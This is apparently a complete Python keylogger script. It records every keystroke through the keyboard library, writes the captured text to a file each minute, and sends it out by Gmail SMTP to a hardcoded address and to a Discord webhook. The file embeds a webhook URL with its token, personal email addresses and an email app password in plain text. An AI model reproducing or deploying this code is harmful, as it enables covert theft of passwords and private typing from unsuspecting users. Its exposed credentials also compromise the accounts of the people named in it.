import time
import threading
import keyboard
import smtplib
import requests
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

# Your Discord webhook URL
webhook_url = 'https://discord.com/api/webhooks/1053177518368247899/1xTfyhE27YzyhGYTyzNHpndGJKIRoKTLI9H2rJKgJy9uzLE2-w0Jz_FdsuHmKyJS-yZQ'

def send_discord_message(message):
    data = {
        'content': message
    }
    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
        print('Message sent to Discord successfully.')
    else:
        print('Failed to send message to Discord.')

def start_timer():
    global timer_active
    timer_active = True
    time.sleep(60)
    timer_active = False

def record_key(key):
    global recorded_text
    if timer_active:
        if key.name == "shift":
            return  # Ignore Shift key
        elif key.name in ["alt", "ctrl", "windows", "tab", "caps lock"] or key.name.startswith("f"):
            recorded_text += " {" + key.name + "} "
        elif key.name == "space":
            recorded_text += " "  # Insert a space without typing "space"
        elif key.name == "backspace":
            recorded_text = recorded_text[:-1]  # Delete the last character
        else:
            if keyboard.is_pressed("shift"):
                recorded_text += key.name.upper()
            else:
                recorded_text += key.name

keyboard.on_release(record_key)

def send_email(output_file):
    # Email configuration
    sender_email = "hirakushiro@gmail.com"  # Your Gmail address
    receiver_email = "tgfmike@gmail.com"   # Receiver's email address
    subject = "Recorded Text File"

    # Set up the MIME
    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = receiver_email
    msg["Subject"] = subject

    # Attach the text file
    with open(output_file, "rb") as file:
        attachment = MIMEApplication(file.read(), _subtype="txt")
        attachment.add_header("content-disposition", f"attachment; filename= {output_file}")
        msg.attach(attachment)

    # Send the email using SMTP
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    smtp_username = sender_email
    smtp_password = "rxrwrkoybhldkmgc"  # Use the provided password here

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()
        print("Email sent successfully.")
        
        # Send the same message to Discord
        send_discord_message(recorded_text)  # Send the recorded text
    except Exception as e:
        print("An error occurred while sending the email:", e)
        send_discord_message(f"Error sending email: {e}")

# Send a startup message to Discord
startup_message = 'PC has started up!'
send_discord_message(startup_message)

while True:
    recorded_text = ""
    timer_active = False
    
    print("Type within the next 60 seconds to record.")

    # Start the timer in a separate thread
    timer_thread = threading.Thread(target=start_timer)
    timer_thread.start()

    while timer_thread.is_alive():
        time.sleep(1)

    # Save the recorded text to a file
    current_time = time.strftime("%Y-%m-%d_%H-%M-%S")
    output_file = f"output_{current_time}.txt"
    with open(output_file, "w") as file:
        file.write(recorded_text)

    print(f"Recorded text saved to file: {output_file}")

    # Send email with the text file and a notification to Discord
    send_email(output_file)
